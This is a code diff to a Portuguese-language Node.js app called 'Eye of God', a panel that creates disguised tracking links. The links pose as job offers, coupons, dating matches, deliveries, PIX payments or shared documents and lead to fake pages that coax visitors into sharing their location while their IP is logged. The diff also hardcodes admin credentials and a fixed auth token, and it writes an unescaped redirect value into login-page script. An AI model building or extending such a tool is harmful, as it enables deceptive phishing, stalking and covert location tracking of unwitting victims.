@@ -6,6 +6,7 @@ const { v4: uuidv4 } = require('uuid');
 const fs = require('fs');
 const path = require('path');
 const fetch = require('node-fetch');
+const cookieParser = require('cookie-parser');
 
 // Inicializar aplicação Express
 const app = express();
@@ -17,6 +18,51 @@ app.use(cors());
 app.use(morgan(isProduction ? 'combined' : 'dev'));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(cookieParser());
+
+// Autenticação básica
+const CREDENTIALS = {
+  username: 'juliodev',
+  password: 'juliodev.tech'
+};
+
+// Middleware de autenticação
+function requireAuth(req, res, next) {
+  // Verificar token de autenticação no cookie ou query parameter
+  const authToken = req.query.token || req.cookies?.authToken;
+  
+  // Bypass para a página de login e a API de login
+  if (req.path === '/login' || req.path === '/api/login') {
+    return next();
+  }
+  
+  // Verificar se é uma rota de rastreamento (estas devem permanecer públicas)
+  if (req.path.startsWith('/t/') || 
+      req.path.startsWith('/s/') || 
+      req.path.startsWith('/l/') ||
+      req.path.startsWith('/api/update-location') ||
+      req.path.startsWith('/vagas/') ||
+      req.path.startsWith('/cupom/') ||
+      req.path.startsWith('/eventos/') ||
+      req.path.startsWith('/match/') ||
+      req.path.startsWith('/entrega/') ||
+      req.path.startsWith('/pagamento/') ||
+      req.path.startsWith('/drive/') ||
+      req.path.startsWith('/docs/') ||
+      req.path.startsWith('/photos/')) {
+    return next();
+  }
+  
+  // Para todas as outras rotas, exigir autenticação
+  if (!authToken || authToken !== 'eyeofgod-juliodev-auth') {
+    return res.redirect('/login?redirect=' + encodeURIComponent(req.originalUrl));
+  }
+  
+  next();
+}
+
+// Aplicar middleware de autenticação a todas as rotas
+app.use(requireAuth);
 
 // Base de dados em arquivo
 const DB_PATH = path.join(__dirname, 'db.json');
@@ -40,17 +86,79 @@ const adjectives = ['seguro', 'rapido', 'privado', 'oficial', 'novo', 'premium',
 const nouns = ['acesso', 'link', 'portal', 'entrada', 'site', 'pagina', 'plataforma', 'app', 'caminho', 'conta', 'perfil', 'docs'];
 const domains = ['online', 'web', 'app', 'site', 'info', 'me', 'net', 'link', 'click', 'go', 'now', 'page'];
 
-// Gerar um slug amigável para o link
-function generateFriendlySlug() {
+// Templates para diferentes tipos de links
+const linkTemplates = {
+  "default": {
+    slugPrefix: "link",
+    maskStyle: "default",
+    pageTitle: "Verificação de Segurança",
+    logo: "shield-alt",
+    primaryColor: "#3498db",
+    message: "Por proteção contra fraudes e phishing, precisamos verificar sua região. Esta verificação rápida ajuda a proteger você e outras pessoas."
+  },
+  "emprego": {
+    slugPrefix: "vaga",
+    maskStyle: "job",
+    pageTitle: "Verificação de Candidatura",
+    logo: "briefcase",
+    primaryColor: "#0e76a8",
+    message: "Para verificarmos as vagas disponíveis na sua região, precisamos confirmar sua localização atual."
+  },
+  "cupom": {
+    slugPrefix: "promo",
+    maskStyle: "discount",
+    pageTitle: "Ativação de Cupom",
+    logo: "tag",
+    primaryColor: "#e74c3c",
+    message: "Para ativar este cupom exclusivo na loja mais próxima, confirme sua localização atual."
+  },
+  "evento": {
+    slugPrefix: "evento",
+    maskStyle: "event",
+    pageTitle: "Convite Exclusivo",
+    logo: "calendar-check",
+    primaryColor: "#9b59b6",
+    message: "Para confirmar sua presença neste evento local, precisamos verificar sua região."
+  },
+  "namoro": {
+    slugPrefix: "match",
+    maskStyle: "dating",
+    pageTitle: "Novo Match Próximo",
+    logo: "heart",
+    primaryColor: "#e84393",
+    message: "Alguém próximo a você mostrou interesse. Compartilhe sua localização para ver quem é."
+  },
+  "entrega": {
+    slugPrefix: "delivery",
+    maskStyle: "delivery",
+    pageTitle: "Confirmar Entrega",
+    logo: "shipping-fast",
+    primaryColor: "#3498db",
+    message: "Para garantir a entrega correta no endereço certo, confirme sua localização atual."
+  },
+  "pagamento": {
+    slugPrefix: "pix",
+    maskStyle: "payment",
+    pageTitle: "Confirmar Transação",
+    logo: "money-bill-wave",
+    primaryColor: "#2ecc71",
+    message: "Para finalizar esta transação com segurança, precisamos confirmar que você está em uma região autorizada."
+  }
+};
+
+// Gerar um slug amigável para o link, usando o prefixo do template correspondente
+function generateFriendlySlug(templateType = 'default') {
+  const template = linkTemplates[templateType] || linkTemplates.default;
+  const slugPrefix = template.slugPrefix;
   const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
   const randomNoun = nouns[Math.floor(Math.random() * nouns.length)];
   const randomNumber = Math.floor(Math.random() * 1000);
   
-  return `${randomAdjective}-${randomNoun}-${randomNumber}`;
+  return `${slugPrefix}-${randomAdjective}-${randomNoun}-${randomNumber}`;
 }
 
-// Gerar URLs mascaradas que parecem legítimas
-function generateMaskedUrl(req, linkId, style = 'default', customMask = null) {
+// Gerar URLs mascaradas que parecem legítimas, adaptadas ao tipo de template
+function generateMaskedUrl(req, linkId, templateType = 'default', customMask = null) {
   const host = req.headers.host;
   const protocol = req.protocol;
   const baseUrl = `${protocol}://${host}`;
@@ -66,20 +174,31 @@ function generateMaskedUrl(req, linkId, style = 'default', customMask = null) {
     }
   }
   
-  // Caso contrário, usar os estilos predefinidos
-  switch (style) {
+  // Obter o template correspondente
+  const template = linkTemplates[templateType] || linkTemplates.default;
+  
+  // Caso contrário, usar os estilos predefinidos com base no template
+  switch (template.maskStyle) {
+    case 'job':
+      return `${baseUrl}/vagas/oportunidade/${generateFriendlySlug(templateType)}`;
+    case 'discount':
+      return `${baseUrl}/cupom/desconto/${generateFriendlySlug(templateType)}`;
+    case 'event':
+      return `${baseUrl}/eventos/convite/${generateFriendlySlug(templateType)}`;
+    case 'dating':
+      return `${baseUrl}/match/perfil/${generateFriendlySlug(templateType)}`;
+    case 'delivery':
+      return `${baseUrl}/entrega/pedido/${generateFriendlySlug(templateType)}`;
+    case 'payment':
+      return `${baseUrl}/pagamento/confirmar/${generateFriendlySlug(templateType)}`;
     case 'google':
       return `${baseUrl}/drive/document/view/${linkId}`;
     case 'document':
       return `${baseUrl}/docs/shared/document/${linkId}/view`;
     case 'photo':
       return `${baseUrl}/photos/album/shared/${linkId}`;
-    case 'payment':
-      return `${baseUrl}/payment/invoice/${linkId}/secure`;
-    case 'login':
-      return `${baseUrl}/account/login/confirm/${linkId}`;
     case 'friendly':
-      const friendlySlug = generateFriendlySlug();
+      const friendlySlug = generateFriendlySlug(templateType);
       return `${baseUrl}/s/${friendlySlug}`;
     case 'short':
       // Gera uma ID curta alfanumérica de 5-7 caracteres
@@ -344,9 +463,14 @@ async function getIPInfo(ip) {
 }
 
 // Rotas
+// Página inicial
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 // Gerar novo link
 app.post('/api/generate-link', async (req, res) => {
-  const { targetUrl, maskStyle, customMask } = req.body;
+  const { targetUrl, maskStyle, customMask, templateType } = req.body;
   
   if (!targetUrl) {
     return res.status(400).json({ error: 'URL de destino é necessária' });
@@ -359,10 +483,13 @@ app.post('/api/generate-link', async (req, res) => {
   // Selecionar estilo de máscara (padrão ou especificado pelo usuário)
   const style = maskStyle || 'default';
   
+  // Selecionar tipo de template (padrão ou especificado pelo usuário)
+  const template = templateType || 'default';
+  
   // Gerar um slug amigável se for estilo 'friendly'
   let friendlySlug = null;
   if (style === 'friendly') {
-    friendlySlug = generateFriendlySlug();
+    friendlySlug = generateFriendlySlug(template);
   } else if (style === 'short') {
     friendlySlug = linkId.substring(0, 6);
   }
@@ -374,6 +501,7 @@ app.post('/api/generate-link', async (req, res) => {
     createdAt: new Date().toISOString(),
     createdBy: getRealIP(req),
     maskStyle: style,
+    templateType: template,
     friendlySlug,
     customMask: customMask || null
   };
@@ -384,7 +512,7 @@ app.post('/api/generate-link', async (req, res) => {
   writeDB(db);
   
   // Gerar o link mascarado apropriado
-  const trackingLink = generateMaskedUrl(req, linkId, style, customMask);
+  const trackingLink = generateMaskedUrl(req, linkId, template, customMask);
   
   res.json({
     success: true,
@@ -392,9 +520,18 @@ app.post('/api/generate-link', async (req, res) => {
     trackingLink,
     shortLink: trackingLink,
     originalUrl: targetUrl,
-    maskStyle: style
+    maskStyle: style,
+    templateType: template
   });
 });
+
+// Adicionar rotas para os novos tipos de links
+app.get('/vagas/oportunidade/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'emprego'));
+app.get('/cupom/desconto/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'cupom'));
+app.get('/eventos/convite/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'evento'));
+app.get('/match/perfil/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'namoro'));
+app.get('/entrega/pedido/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'entrega'));
+app.get('/pagamento/confirmar/:friendlySlug', (req, res) => handleTemplateRedirect(req, res, 'pagamento'));
 
 // Rotas para links mascarados
 app.get('/drive/document/view/:linkId', handleMaskedRedirect);
@@ -482,6 +619,10 @@ app.get('/t/:linkId', async (req, res) => {
   
   writeDB(db);
   
+  // Obter o tipo de template para este link (ou usar o padrão)
+  const templateType = db.links[linkId].templateType || 'default';
+  const template = linkTemplates[templateType] || linkTemplates.default;
+  
   // Em vez de redirecionar diretamente, mostrar uma página intermediária que solicita permissão de localização
   const html = `
   <!DOCTYPE html>
@@ -489,43 +630,48 @@ app.get('/t/:linkId', async (req, res) => {
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Segurança</title>
+    <title>${template.pageTitle}</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <style>
+      :root {
+        --primary-color: ${template.primaryColor};
+      }
       body {
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        background-color: #f0f2f5;
+        font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        background-color: #fafafa;
         color: #333;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
         margin: 0;
-        padding: 20px;
-        text-align: center;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
       }
       .container {
-        max-width: 500px;
-        background-color: white;
+        max-width: 450px;
+        background: #fff;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        border-radius: 6px;
         padding: 30px;
-        border-radius: 8px;
-        box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
       }
       .logo {
+        text-align: center;
         margin-bottom: 20px;
-        color: #3498db;
+        color: var(--primary-color);
         font-size: 40px;
       }
       h1 {
         color: #2c3e50;
         margin-top: 0;
         font-size: 22px;
+        text-align: center;
+        margin-bottom: 8px;
       }
       .subtitle {
         color: #34495e;
         font-size: 16px;
         margin-bottom: 25px;
+        text-align: center;
       }
       p {
         line-height: 1.6;
@@ -533,7 +679,7 @@ app.get('/t/:linkId', async (req, res) => {
         color: #555;
       }
       .redirect-button {
-        background-color: #4CAF50;
+        background-color: var(--primary-color);
         color: white;
         border: none;
         padding: 14px 30px;
@@ -549,13 +695,13 @@ app.get('/t/:linkId', async (req, res) => {
         margin: 0 auto;
       }
       .redirect-button:hover {
-        background-color: #45a049;
+        opacity: 0.9;
         transform: translateY(-2px);
         box-shadow: 0 4px 8px rgba(0,0,0,0.2);
       }
       .loader {
         border: 5px solid #f3f3f3;
-        border-top: 5px solid #3498db;
+        border-top: 5px solid var(--primary-color);
         border-radius: 50%;
         width: 50px;
         height: 50px;
@@ -575,11 +721,11 @@ app.get('/t/:linkId', async (req, res) => {
         display: flex;
         align-items: center;
         text-align: left;
-        border-left: 4px solid #3498db;
+        border-left: 4px solid var(--primary-color);
       }
       .security-badge i {
         font-size: 24px;
-        color: #3498db;
+        color: var(--primary-color);
         margin-right: 15px;
       }
       .security-badge p {
@@ -606,6 +752,7 @@ app.get('/t/:linkId', async (req, res) => {
         font-size: 14px;
         color: #666;
         margin-top: 15px;
+        text-align: center;
       }
       .destination {
         background-color: #f5f5f5;
@@ -613,25 +760,27 @@ app.get('/t/:linkId', async (req, res) => {
         border-radius: 4px;
         font-size: 14px;
         color: #666;
-        margin-top: 15px;
+        margin: 15px auto;
+        max-width: 90%;
         word-break: break-all;
+        text-align: center;
       }
     </style>
   </head>
   <body>
     <div class="container">
       <div class="logo">
-        <i class="fas fa-shield-alt"></i>
+        <i class="fas fa-${template.logo}"></i>
       </div>
-      <h1>Verificação de Segurança</h1>
-      <p class="subtitle">Sua segurança é nossa prioridade</p>
+      <h1>${template.pageTitle}</h1>
+      <p class="subtitle">Garantimos segurança e privacidade</p>
       
       <div class="security-badge">
         <i class="fas fa-lock"></i>
-        <p>Por proteção contra fraudes e phishing, precisamos verificar sua região. Esta verificação rápida ajuda a proteger você e outras pessoas.</p>
+        <p>${template.message}</p>
       </div>
       
-      <p>Estamos verificando que seu acesso é legítimo antes de redirecioná-lo para:</p>
+      <p>Estamos verificando seu acesso antes de redirecioná-lo para:</p>
       <div class="destination">${db.links[linkId].targetUrl}</div>
       
       <div id="loader" class="loader"></div>
@@ -2341,6 +2490,40 @@ app.get('/', (req, res) => {
             </div>
           </div>
           
+          <div class="form-group">
+            <label>Tipo de Link:</label>
+            <select id="linkTemplateType" class="form-control">
+              <option value="default">Padrão</option>
+              <option value="emprego">Vaga de Emprego/Estágio</option>
+              <option value="cupom">Cupom de Desconto</option>
+              <option value="evento">Convite para Evento</option>
+              <option value="namoro">Match de Relacionamento</option>
+              <option value="entrega">Confirmação de Entrega</option>
+              <option value="custom">Personalizado</option>
+            </select>
+          </div>
+          
+          <div id="customTemplateOptions" style="display:none">
+            <div class="form-group">
+              <label>Título da Página:</label>
+              <input type="text" id="customTitle" class="form-control">
+            </div>
+            <div class="form-group">
+              <label>Mensagem de Localização:</label>
+              <input type="text" id="customMessage" class="form-control">
+            </div>
+            <div class="form-group">
+              <label>Cor Principal (Hex):</label>
+              <input type="color" id="customColor" class="form-control">
+            </div>
+            <div class="form-group">
+              <label>Ícone (FontAwesome):</label>
+              <select id="customIcon" class="form-control">
+                <!-- Opções de ícones populares -->
+              </select>
+            </div>
+          </div>
+          
           <button type="submit">
             <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
               <path d="M4.715 6.542 3.343 7.914a3 3 0 1 0 4.243 4.243l1.828-1.829A3 3 0 0 0 8.586 5.5L8 6.086a1 1 0 0 0-.154.199 2 2 0 0 1 .861 3.337L6.88 11.45a2 2 0 1 1-2.83-2.83l.793-.792a4 4 0 0 1-.128-1.287z"/>
@@ -2425,6 +2608,7 @@ app.get('/', (req, res) => {
           const targetUrl = document.getElementById('targetUrl').value;
           const maskStyle = document.getElementById('maskStyle').value;
           let customMask = document.getElementById('customMask').value;
+          const templateType = document.getElementById('templateType').value;
           const loading = document.getElementById('loading');
           const result = document.getElementById('result');
           
@@ -2452,7 +2636,8 @@ app.get('/', (req, res) => {
             body: JSON.stringify({ 
               targetUrl: targetUrl,
               maskStyle: maskStyle,
-              customMask: customMask
+              customMask: customMask,
+              templateType: templateType
             })
           })
           .then(function(response) {
@@ -2505,3 +2690,212 @@ app.listen(PORT, () => {
   console.log(`Servidor rodando na porta ${PORT}`);
   console.log(`Acesse: http://localhost:${PORT}`);
 }); 
+
+// Função para lidar com redirecionamentos de URLs baseadas em template
+function handleTemplateRedirect(req, res, templateType) {
+  const { friendlySlug } = req.params;
+  const db = readDB();
+  
+  // O slug é do formato "tipo-adjetivo-nome-numero", então precisamos pegar o slug completo
+  const slugStart = `${linkTemplates[templateType].slugPrefix}-`;
+  
+  // Encontrar o link pelo slug que começa com o prefixo correto
+  const linkId = Object.keys(db.links).find(id => {
+    const link = db.links[id];
+    return link.friendlySlug && link.friendlySlug.startsWith(slugStart);
+  });
+  
+  if (!linkId) {
+    return res.status(404).send('Link não encontrado');
+  }
+  
+  // Redirecionar para a rota principal de tracking
+  res.redirect(`/t/${linkId}`);
+}
+
+// Rotas
+// Página de login
+app.get('/login', (req, res) => {
+  const redirect = req.query.redirect || '/';
+  
+  // Página de login simples 
+  const html = `
+  <!DOCTYPE html>
+  <html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Eye of God</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f0f2f5;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: #333;
+      }
+      .login-container {
+        background-color: white;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        padding: 40px;
+        width: 90%;
+        max-width: 400px;
+      }
+      .login-header {
+        text-align: center;
+        margin-bottom: 30px;
+      }
+      .login-icon {
+        font-size: 48px;
+        color: #3498db;
+        margin-bottom: 20px;
+      }
+      h1 {
+        margin: 0 0 10px;
+        font-size: 24px;
+        font-weight: 600;
+      }
+      .login-form {
+        margin-top: 20px;
+      }
+      .form-group {
+        margin-bottom: 20px;
+      }
+      label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: 500;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 16px;
+        box-sizing: border-box;
+        transition: border-color 0.3s;
+      }
+      input:focus {
+        border-color: #3498db;
+        outline: none;
+      }
+      .submit-btn {
+        width: 100%;
+        padding: 12px;
+        background-color: #3498db;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+      .submit-btn:hover {
+        background-color: #2980b9;
+      }
+      .error-message {
+        color: #e74c3c;
+        margin-top: 20px;
+        text-align: center;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="login-header">
+        <div class="login-icon">
+          <i class="fas fa-eye"></i>
+        </div>
+        <h1>Eye of God</h1>
+        <p>Painel de controle de rastreamento</p>
+      </div>
+      
+      <form id="loginForm" class="login-form">
+        <div class="form-group">
+          <label for="username">Usuário</label>
+          <input type="text" id="username" name="username" required>
+        </div>
+        
+        <div class="form-group">
+          <label for="password">Senha</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+        
+        <button type="submit" class="submit-btn">Entrar</button>
+        
+        <div id="errorMessage" class="error-message">
+          Usuário ou senha incorretos
+        </div>
+      </form>
+    </div>
+    
+    <script>
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const redirect = '${redirect}';
+        
+        // Fazer a requisição para a API de login
+        fetch('/api/login', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ username, password })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            // Login bem-sucedido, redirecionar para a página solicitada
+            window.location.href = redirect;
+          } else {
+            // Exibir mensagem de erro
+            document.getElementById('errorMessage').style.display = 'block';
+          }
+        })
+        .catch(error => {
+          console.error('Erro ao fazer login:', error);
+          document.getElementById('errorMessage').style.display = 'block';
+        });
+      });
+    </script>
+  </body>
+  </html>
+  `;
+  
+  res.send(html);
+});
+
+// API de login
+app.post('/api/login', (req, res) => {
+  const { username, password } = req.body;
+  
+  // Verificar credenciais
+  if (username === CREDENTIALS.username && password === CREDENTIALS.password) {
+    // Definir cookie de autenticação
+    res.cookie('authToken', 'eyeofgod-juliodev-auth', {
+      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 dias
+      httpOnly: true,
+      secure: isProduction, // Apenas HTTPS em produção
+      sameSite: 'strict'
+    });
+    
+    return res.json({ success: true });
+  }
+  
+  // Credenciais inválidas
+  return res.status(401).json({ success: false, message: 'Credenciais inválidas' });
+});
+
+// Base de dados em arquivo
+// ... existing code ...
